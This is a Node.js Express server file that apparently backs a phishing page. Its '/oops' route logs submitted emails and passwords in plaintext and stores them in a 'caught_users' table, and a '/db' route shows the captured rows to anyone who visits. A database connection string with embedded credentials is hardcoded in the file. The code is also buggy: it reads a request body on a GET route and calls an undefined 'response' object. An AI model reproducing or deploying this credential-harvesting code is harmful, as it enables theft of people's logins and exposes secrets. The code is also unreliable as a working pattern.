var express = require('express');

var pg = require('pg');
var bodyParser = require('body-parser');
var app = express();

var connectStr = "postgres://hhlorjpztogkxd:_jYL2Fa1mJSepcyKvJk8_S1WJ2@ec2-46-137-159-123.eu-west-1.compute.amazonaws.com:5432/d6q5sdg1cfttg7?ssl=true";

app.set('port', (process.env.PORT || 5000));

app.use(express.static(__dirname + '/public'));
app.use(bodyParser.urlencoded());

// views is directory for all template files
app.set('views', __dirname + '/views');
app.set('view engine', 'ejs');

app.get('/', function(request, response) {
  response.render('pages/index');
});

app.get('/db', function (request, response) {
  console.log("herro?");
  pg.connect(connectStr, function(err, client, done) {
	  
    client.query('SELECT * FROM caught_users', function(err, result) {
      done();
      if (err)
       { console.error(err); response.send("Error " + err); }
      else
       { response.render('pages/db', {results: result.rows} ); }
    });
  });
});

/*app.get('/oops', function (request, response) {
	console.log("getting here?");
	response.render('pages/oops');
});*/

app.get('/oops', function(req, res){
	console.log("attempting to insert");
	var email = req.body.email;
	console.log(email);
	var password = req.body.password;
	console.log(password);
	
	pg.connect(connectStr, function(err, client, done) {
	  
		client.query('INSERT INTO caught_users(id, email, password) values($1, $2, $3)', [0, email, password], function(err, result) {
		  done();
		  if (err)
		   { console.error(err); /*res.render('pages/oops');*/ }
		  else{ 
			console.log("should render here?"); 
			}
		});
	});
	console.log("getting here?");
	response.render('pages/oops');
	
});

app.listen(app.get('port'), function() {
  console.log('Node app is running on port', app.get('port'));
});


